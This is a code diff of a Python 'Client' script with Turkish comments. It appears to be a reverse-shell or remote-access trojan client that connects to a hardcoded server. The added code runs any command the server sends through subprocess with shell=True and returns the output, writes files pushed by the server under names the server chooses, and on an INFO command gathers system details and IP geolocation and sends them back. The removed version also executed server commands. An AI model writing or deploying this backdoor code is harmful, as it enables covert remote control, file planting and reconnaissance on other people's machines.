@@ -1,54 +1,83 @@
 import socket
 import os
+import platform
+import requests
+import subprocess
 from colorama import Fore, Style, init
-import pyfiglet
+from pyfiglet import figlet_format
 
-# Colorama'yı başlat
-init(autoreset=True)
+# Colorama'nın otomatik olarak terminali desteklemesini sağlar
+init()
 
-def print_logo():
-    logo = pyfiglet.figlet_format("Client")
-    print(Fore.GREEN + logo + Style.RESET_ALL)
+# Ekranı temizle
+os.system('cls' if os.name == 'nt' else 'clear')
 
-def receive_file(client_socket):
+# Logo oluşturuluyor
+logo = figlet_format("Client", font="starwars")
+print(Fore.CYAN + logo + Style.RESET_ALL)
+
+# İstemci ayarları
+host = '127.0.0.1'
+port = 12334
+
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_socket.connect((host, port))
+
+print(Fore.GREEN + "Bağlantı sağlandı." + Style.RESET_ALL)
+
+def get_ip_and_location():
     try:
-        # Dosya adı ve boyutunu al
-        header = client_socket.recv(1024).decode().split('\n')
-        filename = header[0]
-        file_size = int(header[1])
+        # IP ve konum bilgilerini almak için bir dış API kullanıyoruz
+        response = requests.get('https://ipinfo.io/json')
+        data = response.json()
+        ip_info = f"IP: {data.get('ip')}\nKonum: {data.get('city')}, {data.get('region')}, {data.get('country')}"
+        return ip_info
+    except requests.RequestException as e:
+        return f"Hata: {str(e)}"
+
+while True:
+    try:
+        data = client_socket.recv(1024).decode()
         
-        # Dosyayı al
-        with open(filename, 'wb') as file:
-            file_data = client_socket.recv(file_size)
-            file.write(file_data)
-        print(f"{Fore.GREEN}Dosya '{filename}' başarıyla alındı.{Style.RESET_ALL}")
+        if not data:
+            break
+        
+        if data.startswith('UPLOAD '):
+            filename = data.split(' ', 1)[1]
+            with open(filename, 'wb') as f:
+                while True:
+                    file_data = client_socket.recv(1024)
+                    if b'EOF' in file_data:  # Bitiş sinyalini kontrol et
+                        f.write(file_data.replace(b'EOF', b''))  # EOF'yi temizle
+                        break
+                    f.write(file_data)
+            print(Fore.GREEN + f"Dosya {filename} yüklendi." + Style.RESET_ALL)
+            
+        elif data == 'INFO':
+            local_ip = socket.gethostbyname(socket.gethostname())
+            public_ip = socket.gethostbyname(socket.getfqdn())
+            system_info = platform.platform()
+            location_info = get_ip_and_location()
+            info = (f"Yerel IP: {local_ip}\n"
+                    f"Kamu IP: {public_ip}\n"
+                    f"Sistem Bilgisi: {system_info}\n"
+                    f"{location_info}")
+            client_socket.send(info.encode())
+        
+        elif data == 'EXIT':
+            break
+        
+        else:
+            # Komutları subprocess ile çalıştır ve çıktıyı gönder
+            try:
+                result = subprocess.run(data, shell=True, capture_output=True, text=True)
+                output = result.stdout + result.stderr
+                client_socket.send(output.encode())
+            except Exception as e:
+                client_socket.send(f"Hata: {str(e)}".encode())
+    
     except Exception as e:
-        print(f"{Fore.RED}Dosya alırken hata oluştu: {e}{Style.RESET_ALL}")
+        client_socket.send(f"Hata: {str(e)}".encode())
+        break
 
-def main():
-    print_logo()
-    server_ip = '127.0.0.1'  # Localhost
-    port = 62567             # Belirtilen port numarası
-
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
-        client_socket.connect((server_ip, port))
-
-        while True:
-            # Komut veya dosya alma
-            data = client_socket.recv(1024).decode()
-            if data.startswith("CMD:"):
-                command = data[4:]
-                print(f"{Fore.GREEN}Sunucudan gelen komut: {command}{Style.RESET_ALL}")
-
-                # Komutu çalıştır
-                result = os.popen(command).read()
-
-                # Sonuçları gönder
-                client_socket.sendall(result.encode())
-            elif data.startswith("FILE:"):
-                filename = data[5:]
-                print("Sunucudan dosya alınıyor...")
-                receive_file(client_socket)
-
-if __name__ == "__main__":
-    main()
+client_socket.close()
